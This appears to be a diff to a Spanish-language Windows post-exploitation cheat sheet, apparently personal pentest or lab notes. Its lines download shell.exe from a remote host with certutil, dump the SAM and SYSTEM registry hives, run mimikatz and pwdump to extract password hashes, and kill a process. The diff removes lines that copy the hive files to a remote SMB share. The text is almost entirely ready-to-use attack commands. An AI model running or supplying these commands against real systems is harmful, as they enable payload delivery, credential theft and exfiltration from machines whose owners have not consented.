@@ -1,3 +1,6 @@
+# MATAR UN PID
+taskkill /pid 10720 /F
+
 # DESCARGAS CON CERTUTIL
 certutil.exe -urlcache -split -f http://192.168.1.110:8000/shell.exe shell.exe
 
@@ -23,10 +26,6 @@ lsadump::sam
 # LISTAR GRUPOS LOCALES
 net localgroup
 
-# COPY SAM SYSTEM
-copy sam.copy \\10.9.102.237\smbFolder\sam
-copy system.copy \\10.9.102.237\smbFolder\system
-
 #OBTNER HASHES
 python pwdump.py ../system ../sam
 
@@ -45,7 +44,7 @@ reg save HKLM\SAM sam.backup
 reg save HKLM\SYSTEM system.backup
 
 # LISTAR EL PESO CADA SEG.
-watch -n 1 du -hc system.backu
+watch -n 1 du -hc system.backup
 
 
 #  VIA RDP (PWN3D)
